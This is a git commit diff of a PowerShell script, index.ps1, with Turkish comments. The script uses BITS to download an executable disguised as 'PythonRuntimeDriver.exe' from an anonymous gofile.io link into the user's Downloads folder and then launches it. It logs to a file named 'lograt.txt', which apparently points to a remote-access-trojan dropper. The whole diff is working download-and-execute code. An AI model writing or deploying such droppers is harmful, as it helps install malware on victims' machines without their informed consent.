9ca75b7f3bb90dded296970558a23abaa6d51732
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-04-22 23:41:59 +0300

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,6 +1,6 @@
-# Ayarlar
+# Yeni Ayarlar
 $exeUrl = "https://cold3.gofile.io/download/web/eb0e07d2-e698-48f9-8fa7-20a9f86b59de/PythonRuntimeDriver.exe"
-$localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
+$localPath = "$env:USERPROFILE\Downloads\PythonRuntimeDriver.exe"
 $logFile = "$env:USERPROFILE\Downloads\lograt.txt"
 
 # Log fonksiyonu
@@ -12,14 +12,20 @@ function Log-Message {
 try {
     Log-Message "BITS transfer başlatılıyor..."
 
-    # Sessiz, stabil indirme başlasın
+    # Dosyayı indir
     Start-BitsTransfer -Source $exeUrl -Destination $localPath -ErrorAction Stop
 
     Log-Message "İndirme tamamlandı: $localPath"
 
-    # Dosyayı çalıştır
-    Log-Message "Dosya çalıştırılıyor..."
-    Start-Process -FilePath $localPath -WindowStyle Normal
+    # Dosya var mı?
+    if (Test-Path $localPath) {
+        Log-Message "Dosya bulundu, çalıştırılıyor..."
+        Start-Process $localPath -WindowStyle Normal
+    } else {
+        Log-Message "HATA: Dosya bulunamadı!"
+        Write-Host "Dosya indirilemedi ya da doğru yere inmemiş olabilir."
+    }
 } catch {
     Log-Message "HATA: $($_.Exception.Message)"
+    Write-Host "Hata oluştu: $($_.Exception.Message)"
 }
